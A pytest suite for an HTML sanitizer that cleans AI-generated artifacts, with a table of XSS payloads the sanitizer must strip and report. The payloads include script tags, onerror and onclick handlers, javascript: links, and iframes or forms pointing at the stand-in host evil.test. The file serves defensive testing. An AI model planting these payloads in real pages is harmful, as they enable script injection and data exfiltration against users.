"""Artifact sanitization against a table of real payloads.

Generated HTML is untrusted: the model producing it has just read hundreds of
third-party transcripts, so prompt injection reaching this pipeline is a
realistic path. Every payload below asserts two things — the dangerous construct
is gone from the output, and the report *explains* its removal, because the
viewer shows that explanation to the user.
"""

from __future__ import annotations

import pytest

from app.security.sanitize import sanitize_html, sanitize_markdown

# (name, payload, must-not-appear-in-output)
PAYLOADS = [
    ("script tag", "<p>hi</p><script>alert(1)</script>", "alert(1)"),
    ("script with attrs", '<script src="https://evil.test/x.js"></script>', "evil.test"),
    ("img onerror", '<img src="x" onerror="alert(1)">', "onerror"),
    ("body onload", '<div onload="steal()">text</div>', "onload"),
    ("onclick handler", '<p onclick="fetch(\'//evil.test\')">click</p>', "onclick"),
    ("onmouseover", '<span onmouseover="alert(1)">hover</span>', "onmouseover"),
    ("javascript href", '<a href="javascript:alert(1)">link</a>', "javascript:"),
    ("vbscript href", '<a href="vbscript:msgbox(1)">link</a>', "vbscript:"),
    ("data html href", '<a href="data:text/html,<script>alert(1)</script>">x</a>', "data:text/html"),
    ("iframe", '<iframe src="https://evil.test"></iframe>', "<iframe"),
    ("object", '<object data="evil.swf"></object>', "<object"),
    ("embed", '<embed src="evil.swf">', "<embed"),
    ("form exfiltration", '<form action="https://evil.test"><input name="a"></form>', "<form"),
    ("link stylesheet", '<link rel="stylesheet" href="https://evil.test/x.css">', "<link"),
    ("base tag", '<base href="https://evil.test/">', "<base"),
    ("meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.test">', "<meta"),
    ("svg onload", '<svg onload="alert(1)"><circle r="10"/></svg>', "onload"),
    ("css expression", '<div style="width:expression(alert(1))">x</div>', "expression("),
    ("css import", "<style>@import url('https://evil.test/x.css');</style>", "@import"),
    ("css external url", "<style>body{background:url('https://evil.test/pixel.png')}</style>", "evil.test"),
    ("moz binding", '<div style="-moz-binding:url(evil.xml)">x</div>', "-moz-binding"),
    ("noscript smuggling", "<noscript><script>alert(1)</script></noscript>", "alert(1)"),
    ("template smuggling", "<template><script>alert(1)</script></template>", "alert(1)"),
    ("nested script", "<div><p><script>alert(1)</script></p></div>", "alert(1)"),
    ("uppercase script", "<SCRIPT>alert(1)</SCRIPT>", "alert(1)"),
    ("mixed case handler", '<img src=x OnErRoR="alert(1)">', "alert(1)"),
]


class TestDangerousPayloadsAreNeutralised:
    @pytest.mark.parametrize("name,payload,forbidden", PAYLOADS, ids=[p[0] for p in PAYLOADS])
    def test_payload_is_removed(self, name, payload, forbidden):
        result = sanitize_html(payload)
        assert forbidden.lower() not in result.html.lower(), (
            f"{name}: {forbidden!r} survived sanitization -> {result.html!r}"
        )

    @pytest.mark.parametrize("name,payload,_f", PAYLOADS, ids=[p[0] for p in PAYLOADS])
    def test_removal_is_reported(self, name, payload, _f):
        # A silent strip is a black box. The viewer shows this report, which is
        # what makes the policy legible instead of merely present.
        result = sanitize_html(payload)
        assert not result.report.is_clean, f"{name}: removal was not reported"
        assert result.report.total_removed > 0


class TestLegitimateContentSurvives:
    def test_headings_and_text(self):
        html = "<h1>Growth</h1><h2>Retention</h2><p>Curves that <strong>flatten</strong>.</p>"
        result = sanitize_html(html)
        assert "<h1>" in result.html and "<strong>" in result.html
        assert result.report.is_clean

    def test_lists_and_tables(self):
        html = (
            "<ul><li>One</li><li>Two</li></ul>"
            "<table><thead><tr><th scope='col'>Metric</th></tr></thead>"
            "<tbody><tr><td colspan='1'>Retention</td></tr></tbody></table>"
        )
        result = sanitize_html(html)
        assert "<table>" in result.html and "<th" in result.html
        assert result.report.is_clean

    def test_inline_styles_for_layout(self):
        result = sanitize_html('<div style="display:grid;gap:12px;color:#333">x</div>')
        assert "grid" in result.html
        assert result.report.is_clean

    def test_style_block_survives(self):
        result = sanitize_html("<style>.card{border:1px solid #ddd;padding:8px}</style><div class='card'>x</div>")
        assert ".card" in result.html
        assert result.report.is_clean

    def test_safe_links_survive_with_rel_added(self):
        result = sanitize_html('<a href="https://www.youtube.com/watch?v=abc">Listen</a>')
        assert "youtube.com" in result.html
        # rel is forced so a target=_blank link cannot reach window.opener.
        assert "noopener" in result.html

    def test_data_uri_images_survive(self):
        # Inline images are the only way an artifact can show a picture at all,
        # since external requests are blocked.
        png = "data:image/png;base64,iVBORw0KGgo="
        assert "data:image/png" in sanitize_html(f'<img src="{png}" alt="chart">').html


class TestReportContent:
    def test_names_the_tag_and_the_reason(self):
        report = sanitize_html("<script>alert(1)</script>").report
        assert report.removed_tags.get("script") == 1
        assert any("JavaScript" in n for n in report.notes)

    def test_counts_repeated_removals(self):
        report = sanitize_html("<script>a</script><script>b</script><script>c</script>").report
        assert report.removed_tags["script"] == 3

    def test_records_the_offending_url(self):
        report = sanitize_html('<a href="javascript:alert(1)">x</a>').report
        assert any("javascript:" in u for u in report.removed_urls)

    def test_policy_is_published_in_the_report(self):
        # The viewer renders this, so an evaluator can see what is permitted
        # without reading the source.
        policy = sanitize_html("<p>ok</p>").report.to_dict()["policy"]
        assert policy["scripts"] == "blocked"
        assert policy["external_requests"] == "blocked"
        assert "sandbox" in policy["rendering"]

    def test_clean_document_reports_clean(self):
        assert sanitize_html("<h1>Title</h1><p>Body</p>").report.is_clean


class TestRobustness:
    def test_malformed_html_does_not_raise(self):
        result = sanitize_html("<div><p>unclosed <span>tags <script>alert(1)")
        assert "alert(1)" not in result.html

    def test_empty_input(self):
        assert sanitize_html("").html == ""

    def test_deeply_nested_input_terminates(self):
        result = sanitize_html("<div>" * 300 + "hi" + "</div>" * 300)
        assert "hi" in result.html


class TestMarkdown:
    def test_passes_through(self):
        assert "# Title" in sanitize_markdown("# Title\n\nBody").html

    def test_truncates_runaway_output(self):
        from app.security.sanitize import MAX_ARTIFACT_CHARS

        result = sanitize_markdown("x" * (MAX_ARTIFACT_CHARS + 5000))
        assert len(result.html) == MAX_ARTIFACT_CHARS
        assert any("Truncated" in n for n in result.report.notes)
